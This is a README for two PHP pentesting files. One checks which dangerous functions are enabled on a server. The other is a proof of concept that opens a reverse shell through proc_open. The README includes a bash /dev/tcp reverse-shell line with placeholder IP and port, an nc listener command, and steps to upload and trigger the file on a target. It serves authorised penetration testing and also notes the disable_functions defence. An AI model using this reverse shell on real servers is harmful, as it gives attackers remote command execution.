# PHP Dangerous Functions Identifier

Two PHP files for identifying enabled dangerous functions on a PHP server and demonstrating `proc_open` misuse for reverse shell generation.

---

## Files

| File | Purpose |
|---|---|
| `php_dangerous_functions_identifier.php` | Checks which dangerous PHP functions are enabled on the server |
| `proc_open_missuse.php` | PoC demonstrating reverse shell via `proc_open` |

---

## Requirements

- PHP CLI or a web server with PHP enabled.
- No external dependencies.

---

## Usage

### Identify enabled dangerous functions

Upload or place `php_dangerous_functions_identifier.php` on the target server and request it, or run locally:

```bash
php php_dangerous_functions_identifier.php
```

Example output:

```
system is enabled
exec is enabled
shell_exec is enabled
eval is enabled
assert is enabled
```

Any function listed is potentially exploitable for code execution or privilege escalation.

### proc_open reverse shell PoC

Edit `proc_open_missuse.php` to set your listener IP and port:

```php
$cmd = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'";
```

Start a listener:

```bash
nc -lvnp 4444
```

Upload and trigger the PHP file on the target server.

---

## Checked Functions

`pcntl_*`, `error_log`, `system`, `exec`, `shell_exec`, `popen`, `proc_open`, `passthru`, `link`, `symlink`, `syslog`, `mail`, `eval`, `assert`, `ini_set`, and more (44 total).

Credit: IppSec, ashwinshenoi99

---

## Notes

- `disable_functions` in `php.ini` is the primary defence. Any function not listed there is enabled by default.
- The identifier checks `function_exists()` — it does not bypass `disable_functions`.
- The reverse shell PoC requires `proc_open` to be enabled and outbound TCP to be allowed from the server.

---

## Disclaimer

For authorised penetration testing and security research only.
